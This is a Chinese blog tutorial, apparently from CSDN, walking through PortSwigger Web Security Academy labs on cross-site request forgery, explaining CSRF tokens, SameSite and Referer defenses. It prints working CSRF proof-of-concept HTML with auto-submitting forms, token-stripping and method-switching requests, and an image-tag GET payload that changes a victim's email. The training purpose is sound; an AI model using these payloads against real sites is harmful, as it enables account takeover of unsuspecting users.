# 原创
：  【burpsuite安全练兵场-客户端12】跨站点请求伪造CSRF-12个实验（全）

# 【burpsuite安全练兵场-客户端12】跨站点请求伪造CSRF-12个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）构造CSRF攻击（√）
（2）颠覆应用程序逻辑（√）
（3）绕过SameSite Cookie限制（√）
（4）绕过基于引用的CSRF防御（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、跨站点请求伪造（CSRF）](#%E4%B8%80%E3%80%81%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响：](#2%E3%80%81%E5%BD%B1%E5%93%8D%EF%BC%9A)

[3、原理：](#3%E3%80%81%E5%8E%9F%E7%90%86%EF%BC%9A)

[4、构造CSRF攻击](#4%E3%80%81%E6%9E%84%E9%80%A0CSRF%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%97%A0%E9%98%B2%E5%BE%A1%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E)[实验1：无防御的CSRF漏洞](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%97%A0%E9%98%B2%E5%BE%A1%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E)

[5、利用CSRF](#5%E3%80%81%E5%88%A9%E7%94%A8CSRF)

[6、针对CSRF的常见防御措施](#6%E3%80%81%E9%92%88%E5%AF%B9CSRF%E7%9A%84%E5%B8%B8%E8%A7%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD)

[二、绕过CSRF令牌验证](#%E4%BA%8C%E3%80%81%E7%BB%95%E8%BF%87CSRF%E4%BB%A4%E7%89%8C%E9%AA%8C%E8%AF%81)

[1、CSRF令牌](#1%E3%80%81CSRF%E4%BB%A4%E7%89%8C)

[2、CSRF令牌的验证取决于请求方法](#2%E3%80%81CSRF%E4%BB%A4%E7%89%8C%E7%9A%84%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BB%A4%E7%89%8C%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E7%9A%84CSRF)[实验2：令牌验证取决于请求方法的CSRF](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BB%A4%E7%89%8C%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E7%9A%84CSRF)

[3、CSRF令牌的验证取决于令牌是否存在](#3%E3%80%81CSRF%E4%BB%A4%E7%89%8C%E7%9A%84%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E4%BB%A4%E7%89%8C%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8)

[实验3：CSRF，其中令牌验证取决于令牌是否存在](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ACSRF%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BB%A4%E7%89%8C%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E4%BB%A4%E7%89%8C%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8)

[4、CSRF令牌未绑定到用户会话](#4%E3%80%81CSRF%E4%BB%A4%E7%89%8C%E6%9C%AA%E7%BB%91%E5%AE%9A%E5%88%B0%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E4%BB%A4%E7%89%8C%E6%9C%AA%E7%BB%91%E5%AE%9A%E5%88%B0%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D%E7%9A%84CSRF)[实验4：令牌未绑定到用户会话的CSRF](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E4%BB%A4%E7%89%8C%E6%9C%AA%E7%BB%91%E5%AE%9A%E5%88%B0%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D%E7%9A%84CSRF)

[5、CSRF令牌绑定到非会话Cookie](#5%E3%80%81CSRF%E4%BB%A4%E7%89%8C%E7%BB%91%E5%AE%9A%E5%88%B0%E9%9D%9E%E4%BC%9A%E8%AF%9DCookie)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E4%BB%A4%E7%89%8C%E7%BB%91%E5%AE%9A%E5%88%B0%E9%9D%9E%E4%BC%9A%E8%AF%9Dcookie%E7%9A%84CSRF)[实验5：令牌绑定到非会话cookie的CSRF](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E4%BB%A4%E7%89%8C%E7%BB%91%E5%AE%9A%E5%88%B0%E9%9D%9E%E4%BC%9A%E8%AF%9Dcookie%E7%9A%84CSRF)

[6、CSRF令牌只是在Cookie中复制](#6%E3%80%81CSRF%E4%BB%A4%E7%89%8C%E5%8F%AA%E6%98%AF%E5%9C%A8Cookie%E4%B8%AD%E5%A4%8D%E5%88%B6)

[        ](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E6%A0%87%E8%AE%B0%E5%9C%A8Cookie%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84CSRF)[实验6：标记在Cookie中重复的CSRF](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E6%A0%87%E8%AE%B0%E5%9C%A8Cookie%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84CSRF)

[三、绕过SameSite Cookie限制](#%E4%B8%89%E3%80%81%E7%BB%95%E8%BF%87SameSite%20Cookie%E9%99%90%E5%88%B6)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、SameSite Cookie的上下文中、网站](#2%E3%80%81SameSite%20Cookie%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E3%80%81%E7%BD%91%E7%AB%99)

[3、站点和源之间的区别](#3%E3%80%81%E7%AB%99%E7%82%B9%E5%92%8C%E6%BA%90%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB)

[3、SameSite工作原理](#3%E3%80%81SameSite%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86)

[4、使用GET请求绕过SameSite Lax限制](#4%E3%80%81%E4%BD%BF%E7%94%A8GET%E8%AF%B7%E6%B1%82%E7%BB%95%E8%BF%87SameSite%20Lax%E9%99%90%E5%88%B6)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E9%80%9A%E8%BF%87%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E7%BB%95%E8%BF%87SameSite%20Lax)[实验7：通过方法覆盖绕过SameSite Lax](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E9%80%9A%E8%BF%87%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E7%BB%95%E8%BF%87SameSite%20Lax)

[5、使用现场小工具绕过SameSite限制](#5%E3%80%81%E4%BD%BF%E7%94%A8%E7%8E%B0%E5%9C%BA%E5%B0%8F%E5%B7%A5%E5%85%B7%E7%BB%95%E8%BF%87SameSite%E9%99%90%E5%88%B6)

[        ](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E9%80%9A%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87SameSite%20Strict)[实验8：通过客户端重定向绕过SameSite Strict](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E9%80%9A%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87SameSite%20Strict)

[6、通过易受攻击的同级域绕过SameSite限制](#6%E3%80%81%E9%80%9A%E8%BF%87%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E5%90%8C%E7%BA%A7%E5%9F%9F%E7%BB%95%E8%BF%87SameSite%E9%99%90%E5%88%B6)

[        ](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E9%80%9A%E8%BF%87%E5%85%84%E5%BC%9F%E5%9F%9F%E4%B8%A5%E6%A0%BC%E7%BB%95%E8%BF%87SameSite)[实验9：通过兄弟域严格绕过SameSite](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E9%80%9A%E8%BF%87%E5%85%84%E5%BC%9F%E5%9F%9F%E4%B8%A5%E6%A0%BC%E7%BB%95%E8%BF%87SameSite)

[7、使用新发布的Cookie绕过SameSite Lax限制](#7%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B0%E5%8F%91%E5%B8%83%E7%9A%84Cookie%E7%BB%95%E8%BF%87SameSite%20Lax%E9%99%90%E5%88%B6)

[ ](#%C2%A0%E5%AE%9E%E9%AA%8C10%EF%BC%9A%E9%80%9A%E8%BF%87cookie%E5%88%B7%E6%96%B0%E7%BB%95%E8%BF%87SameSite%20Lax)[        ](#%C2%A0%E5%AE%9E%E9%AA%8C10%EF%BC%9A%E9%80%9A%E8%BF%87cookie%E5%88%B7%E6%96%B0%E7%BB%95%E8%BF%87SameSite%20Lax)[实验10：通过cookie刷新绕过SameSite Lax](#%C2%A0%E5%AE%9E%E9%AA%8C10%EF%BC%9A%E9%80%9A%E8%BF%87cookie%E5%88%B7%E6%96%B0%E7%BB%95%E8%BF%87SameSite%20Lax)

[四、绕过基于引用的CSRF防御](#%E5%9B%9B%E3%80%81%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E5%BC%95%E7%94%A8%E7%9A%84CSRF%E9%98%B2%E5%BE%A1)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、引用方的验证取决于是否存在标头](#2%E3%80%81%E5%BC%95%E7%94%A8%E6%96%B9%E7%9A%84%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%A0%87%E5%A4%B4)

[        ](#%E5%AE%9E%E9%AA%8C11%EF%BC%9ACSRF%EF%BC%8C%E5%85%B6%E4%B8%ADReferer%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%A0%87%E5%A4%B4)[实验11：CSRF，其中Referer验证取决于是否存在标头](#%E5%AE%9E%E9%AA%8C11%EF%BC%9ACSRF%EF%BC%8C%E5%85%B6%E4%B8%ADReferer%E9%AA%8C%E8%AF%81%E5%8F%96%E5%86%B3%E4%BA%8E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%A0%87%E5%A4%B4)

[3、可以绕过引用方的验证](#3%E3%80%81%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E5%BC%95%E7%94%A8%E6%96%B9%E7%9A%84%E9%AA%8C%E8%AF%81)

[        ](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E5%BC%95%E7%94%A8%E6%96%B9%E9%AA%8C%E8%AF%81%E4%B8%AD%E6%96%AD%E7%9A%84CSRF)[实验12：引用方验证中断的CSRF](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E5%BC%95%E7%94%A8%E6%96%B9%E9%AA%8C%E8%AF%81%E4%B8%AD%E6%96%AD%E7%9A%84CSRF)

---


## 一、跨站点请求伪造（CSRF）

> 
<h3>1、简述：</h3>
跨站点请求伪造（CSRF）是一个Web安全漏洞，使得攻击者能够诱使用户执行他们不打算执行的操作。它允许攻击者部分规避同源策略，该策略旨在防止不同的网站相互干扰
<hr/>
<h3>2、影响：</h3>
在成功的CSRF攻击中，攻击者会让受害者用户无意中执行某个操作。如可能是更改帐户上的电子邮件地址、更改密码或进行资金转账。根据操作的性质，攻击者可能能够完全控制用户帐户。如果受损用户在应用程序中具有特权角色，则攻击者可能能够完全控制应用程序的所有数据和功能。 
<hr/>
<h3>3、原理：</h3>
1、CSRF攻击必须具备三个关键条件：
<pre><code>    1、一个操作行动。应用程序中存在攻击者有理由引发的操作。这可能是一个特权操作（如修改其他用户的权限），也可能是对用户特定数据的任何操作（如更改用户自己的密码）。
    2、基于Cookie的会话处理。执行操作涉及发出一个或多个HTTP请求，应用程序仅依赖会话cookie来识别发出请求的用户。没有其他机制可用于跟踪会话或验证用户请求。
    3、没有不可预测的请求参数。执行操作的请求不包含任何攻击者无法确定或猜测其值的参数。例如，当使用户更改其密码时，如果攻击者需要知道现有密码的值，则函数不容易受到攻击。
</code></pre>
<hr/>
2、示例
<pre><code>1、某个应用程序包含允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作时，会发出如下所示的HTTP请求：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com

2、这符合CSRF要求的条件：
攻击者会对更改用户帐户上的电子邮件地址的操作感兴趣。在此操作之后，攻击者通常能够触发密码重置并完全控制用户帐户。
应用程序使用会话cookie来标识发出请求的用户。没有其他令牌或机制来跟踪用户会话。
攻击者可以轻松确定执行操作所需的请求参数值。

3、具备这些条件后，攻击者可以构建包含以下HTML的网页：
&lt;html&gt;
    &lt;body&gt;
        &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
        &lt;/form&gt;
        &lt;script&gt;
            document.forms[0].submit();
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;

4、 如果受影响用户访问攻击者的网页，则会发生以下情况：
攻击者的页面将触发对易受攻击网站的HTTP请求。
如果用户登录到易受攻击的网站，其浏览器将自动在请求中包含其会话Cookie（假设未使用SameSite Cookie）。
易受攻击的网站将以正常方式处理请求，将其视为受害用户发出的请求，并更改其电子邮件地址</code></pre>
虽然CSRF通常是针对基于Cookie的会话处理进行描述的，但它也出现在应用程序自动向请求添加一些用户凭据的其他上下文中，例如HTTP基本身份验证和基于证书的身份验证



### 2、影响：

---


> 
<h3>4、构造CSRF攻击</h3>
1、手动创建CSRF利用所需的HTML可能很麻烦，特别是在所需请求包含大量参数或请求中存在其他异常的情况下。构建CSRF利用漏洞攻击的最简单方法是使用 CSRF PoC发生器 内置于BP专业版：
<pre><code>    1、在Burp Suite Professional中的任意位置选择您想要测试或利用的请求。
    2、从右键单击上下文菜单中，选择参与度工具/生成CSRF PoC。
    3、Burp Suite将生成一些HTML来触发选定的请求（不包括cookie，它将由受害者的浏览器自动添加）。
    4、可以调整CSRF PoC生成器中的各种选项来微调攻击的各个方面。在一些不寻常的情况下，您可能需要这样做，以处理请求的古怪特性。
    5、将生成的HTML复制到网页中，在已登录到易受攻击网站的浏览器中查看该网页，并测试是否成功发出预期请求以及是否发生所需操作。</code></pre>
示例：


<hr/>
2、涉及实验：<br/> 实验1：无防御的CSRF漏洞


> 
<h3>实验1：无防御的CSRF漏洞</h3>
信息：
本实验的电子邮件更改功能易受CSRF攻击。
完成实验：编制HTML，使用CSRF攻击更改查看者的电子邮件地址并将其上载到漏洞利用服务器
已有账号：wiener:peter
<hr/>
part1:
登录帐户，提交“更新电子邮件”表单

 HTTP代理历史记录中查找生成的请求


右键单击请求并选择参与度工具/生成CSRF PoC。启用该选项以包括自动提交脚本，然后单击“重新生成”


并复制HTML 

<hr/>
part2:
转到漏洞利用服务器，将漏洞利用HTML粘贴到“正文”部分，然后单击store“存储”。<br/> 验证该漏洞是否有效(view exploit“查看漏洞”），最后“交付给受害者”




---


> 
<h3>5、利用CSRF</h3>
1、跨站点请求伪造攻击的传递机制本质上与反射XSS相同。通常攻击者会将恶意HTML放到他们控制的网站上，然后诱使受害者访问该网站。可以通过经由电子邮件或社交媒体消息向用户馈送到网站的链接来完成。如果攻击是针对某个流行网站（如用户评论中），可能只是等待用户访问该网站。
<hr/>
2、一些简单的CSRF利用漏洞攻击使用GET方法，并且可以完全独立，在易受攻击的网站上只有一个URL。在这种情况下，攻击者可能不需要使用外部站点，就可以直接向受害者提供易受攻击的域中的恶意URL。
在上例中，如果可以使用GET方法执行更改电子邮件地址的请求，则自包含攻击如下所示：<br/> &lt;img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"&gt;
<hr/>
3、XSS和CSRF区别
<pre><code>跨站点脚本（XSS）使得攻击者能够在受害用户的浏览器中执行任意JavaScript。

跨站点请求伪造（CSRF）使攻击者能够诱使受害用户执行他们不希望执行的操作。</code></pre>
<pre><code>XSS漏洞的后果通常比CSRF漏洞更严重：

    1、CSRF通常只适用于用户能够执行的操作的子集。许多应用程序通常实现CSRF防御，但忽略了一个或两个暴露的操作。相反，成功的XSS漏洞利用通常可诱使用户执行该用户能够执行的任何动作，而不管漏洞产生于何种功能。
    2、CSRF可以描述为“单向”漏洞，因为虽然攻击者可以诱使受害者发出HTTP请求，但他们无法检索该请求的响应。相反，XSS是“双向的”，因为攻击者注入的脚本可以发出任意请求，读取响应，并将数据泄漏到攻击者选择的外部域</code></pre>

<hr/>
4、CSRF令牌
一些XSS攻击确实可以通过有效地使用CSRF令牌来防止。一个简单的反射XSS漏洞，可以轻易地利用它：
<pre>`https://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;`</pre>
示例：
<pre><code>1、假设易受攻击的函数包含CSRF令牌：
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&amp;message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;

2、假设服务器正确地验证了CSRF令牌，并拒绝了没有有效令牌的请求，那么该令牌确实可以防止利用XSS漏洞。线索就在名字里：“跨站脚本”至少在其反射形式中涉及跨站请求。通过防止攻击者伪造跨站点请求，应用程序防止了对XSS漏洞的轻微攻击。

3、重要的警告：
    1、如果反射的XSS漏洞存在于站点上不受CSRF令牌保护的函数中的任何其他地方，则可以通过正常方式利用该XSS。
    2、如果可利用的XSS漏洞存在于站点上的任何位置，则可以利用该漏洞使受害用户执行操作，即使这些操作本身受到CSRF令牌的保护。在这种情况下，攻击者的脚本可以请求相关页获取有效的CSRF令牌，然后使用该令牌执行受保护的操作。
    3、CSRF令牌无法防止 存储XSS脆弱性。如果受CSRF标记保护的页也是 存储XSS漏洞，则可以通过通常的方式利用该XSS漏洞，并且XSS有效负载将在用户访问该页面时执行。</code></pre>



---


> 
<h3>6、针对CSRF的常见防御措施</h3>
1、成功发现和利用CSRF漏洞通常需要绕过目标网站、受害者的浏览器或两者部署的反CSRF措施。会遇到的最常见的防御措施如下：
<pre><code>1、CSRF令牌-CSRF令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。尝试执行敏感操作（如提交表单）时，客户端必须在请求中包含正确的CSRF令牌。这使得攻击者很难代表受害者构造有效的请求。
2、SameSite cookies- SameSite是一种浏览器安全机制，用于确定何时将网站的cookies包含在源自其他网站的请求中。由于执行敏感操作的请求通常需要经过身份验证的会话Cookie，因此适当的SameSite限制可以防止攻击者跨站点触发这些操作。
3、基于Referer的验证--一些应用程序利用HTTP Referer头来尝试防御CSRF攻击，通常是通过验证请求是否来自应用程序自己的域。这通常不如CSRF令牌验证有效。</code></pre>



---


---


## 二、绕过CSRF令牌验证

> 
<h3>1、CSRF令牌</h3>
1、CSRF令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。发出执行敏感操作（如提交表单）的请求时，客户端必须包含正确的CSRF令牌。否则，服务器将拒绝执行请求的操作。
<pre><code>1、与客户端共享CSRF令牌的常见方法是将它们作为隐藏参数包含在HTML表单中，例如：
&lt;form name="change-email-form" action="/my-account/change-email" method="POST"&gt;
    &lt;label&gt;Email&lt;/label&gt;
    &lt;input required type="email" name="email" value="example@normal-website.com"&gt;
    &lt;input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"&gt;
    &lt;button class='button' type='submit'&gt; Update email &lt;/button&gt;
&lt;/form&gt;


2、提交此表单将导致以下请求：
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com</code></pre>
如果正确实现，CSRF令牌会使攻击者难以代表受害者构造有效请求，从而有助于防御CSRF攻击。由于攻击者无法预测CSRF令牌的正确值，因此无法将其包含在恶意请求中。 
<hr/>
2、CSRF令牌不必作为隐藏参数在后请求。如一些应用程序将CSRF令牌放在HTTP头中。令牌的传输方式对整个机制的安全性具有重大影响。
<hr/>
3、CSRF令牌验证中的常见缺陷
（1）CSRF令牌的验证取决于请求方法
（2）


---


> 
<h3>2、CSRF令牌的验证取决于请求方法</h3>
1、当请求使用POST方法时，一些应用程序可以正确地验证令牌，但当使用GET方法时，则跳过验证。
<pre><code>在这种情况下，攻击者可以切换到GET方法来绕过验证并发起CSRF攻击：
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</code></pre>
<hr/>
2、涉及实验：
实验2：令牌验证取决于请求方法的CSRF


> 
<h3>实验2：令牌验证取决于请求方法的CSRF</h3>
信息：
本实验的电子邮件更改功能易受CSRF攻击。尝试阻止CSRF攻击，但仅对某些类型的请求应用防御。
解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址
已有账号：wiener:peter
<hr/>
part1:
登录帐户。提交"更新电子邮件"表单，并在代理历史记录中查找生成的请求



将请求发送到Burp Repeater，并观察如果您更改csrf参数的值，则请求被拒绝。<br/> 使用上下文菜单上的"Changerequestmethod"将其转换为GET请求，并观察CSRF令牌是否不再经过验证



右键单击请求，然后从上下文菜单中选择Engagement tools/Generate CSRF PoC


启用该选项以包括自动提交脚本，然后单击"重新生成"，再复制HTML



<hr/>
part2:
转到漏洞利用服务器，将漏洞利用HTML粘贴到"正文"部分，然后单击"存储"。<br/> 要验证该漏洞是否有效，请单击"View exploit"（查看漏洞），单击"交付给受害者"

完成实验



---


> 
<h3>3、CSRF令牌的验证取决于令牌是否存在</h3>
1、某些应用程序在令牌存在时正确验证令牌，但如果忽略令牌，则跳过验证。
<pre><code>在这种情况下，攻击者可以删除包含令牌的整个参数（而不仅仅是其值）以绕过验证并发起CSRF攻击：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net</code></pre>
<hr/>
2、涉及实验：
实验3：CSRF，其中令牌验证取决于令牌是否存在


> 
<h3>实验3：CSRF，其中令牌验证取决于令牌是否存在</h3>
信息：
本实验的电子邮件更改功能易受CSRF攻击。
解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址
已有账号：wiener:peter
<hr/>
part1:
登录帐户。提交"更新电子邮件"表单，并在代理历史记录中查找生成的请求


 <img alt="" height="936" src="https://img-blog.csdnimg.cn/571beffa0e6a41a796a003d4fc3f13e1.png" width="1200"/>


将请求发送到Burp Repeater，更改csrf参数的值，则请求被拒绝。<br/> 完全删除csrf参数请求被接受




右键单击请求，然后从上下文菜单中选择Engagement tools/Generate CSRF PoC
启用该选项以包括自动提交脚本，然后单击"重新生成"，再复制HTML


<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0a70004303bfec8dc05f4f8d007a00e7.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="333333&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<hr/>
part2:
转到漏洞利用服务器，将漏洞利用HTML粘贴到"正文"部分，然后单击"存储"。<br/> 要验证该漏洞是否有效，请单击"View exploit"（查看漏洞），单击"交付给受害者"


完成实验




---


> 
<h3>4、CSRF令牌未绑定到用户会话</h3>
1、某些应用程序不验证令牌是否与发出请求的用户属于同一会话。相反应用程序维护一个全局令牌池，已发出令牌并接受出现在此池中的任何令牌
<hr/>
2、在这种情况下，攻击者可以使用自己的帐户登录应用程序，获得有效令牌，然后将该令牌提供给CSRF攻击中的受害用户。 
<hr/>
3、涉及实验：
实验4：令牌未绑定到用户会话的CSRF


---


> 
<h3>实验4：令牌未绑定到用户会话的CSRF</h3>
信息：
1、这个实验室的电子邮件更改功能对 CSRF 来说是脆弱的。它使用令牌试图防止 CSRF 攻击，但没有集成到站点的会话处理系统中。
2、解决实验：使用开发服务器托管一个 HTML 页面，该页面使用 CSRF 攻击来改变查看者的电子邮件地址
3、已有账号：
wiener:peter
carlos:montoya
<hr/>
part1:
登录帐户。提交"更新电子邮件"表单，并拦截生成的请求。<br/> 记下CSRF令牌的值，然后丢弃请求




<pre>`Z4wM1sCQzcxsKeoFxdbE2fNHUkUjoq8O`</pre>

打开一个私人/匿名浏览器窗口，登录到另一个帐户，并发送更新电子邮件请求到BP<br/> 如果将CSRF令牌与来自其他帐户的值交换，则请求将被接受

 <img alt="" height="994" src="https://img-blog.csdnimg.cn/4c01eaa7875f469b8097d2f6bbd3f1bf.png" width="1200"/>
使用其他账号的csrf令牌更改成功



<hr/>
part2:
<br/> 创建并托管概念利用验证（CSRF令牌是一次性的，因此需要添加一个新令牌，刷新页面再次请求，就是新的了）

 复制HTML<img alt="" height="936" src="https://img-blog.csdnimg.cn/2e4e471a15f4440987c1304f677608c6.png" width="1200"/>

<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0a4100cf032ba6dbc3d33da90039005e.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="111111&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="hidden" name="csrf" value="sjGB2t7bA43mWMx6JQezFiBW2BJkty1k" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
存储漏洞，然后单击"Deliver exploit to victim"（发送给受害者）


完成实验




---


> 
<h3>5、CSRF令牌绑定到非会话Cookie</h3>
1、在上述漏洞的变体中，某些应用程序确实将CSRF令牌绑定到Cookie，但不是绑定到用于跟踪会话的同一Cookie。
<pre><code>1、当应用程序使用两个不同的框架时，这很容易发生，一个用于会话处理，一个用于CSRF保护，这两个框架没有集成在一起：
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</code></pre>
2、这种情况更难利用，但仍然是脆弱的。如果网站包含允许攻击者在受害者的浏览器中设置Cookie的任何行为，则攻击就有可能发生。攻击者可以使用自己的帐户登录应用程序，获取有效令牌和关联的Cookie，利用Cookie设置行为将其Cookie放入受害者的浏览器，并在CSRF攻击中将其令牌提供给受害者。
<hr/>
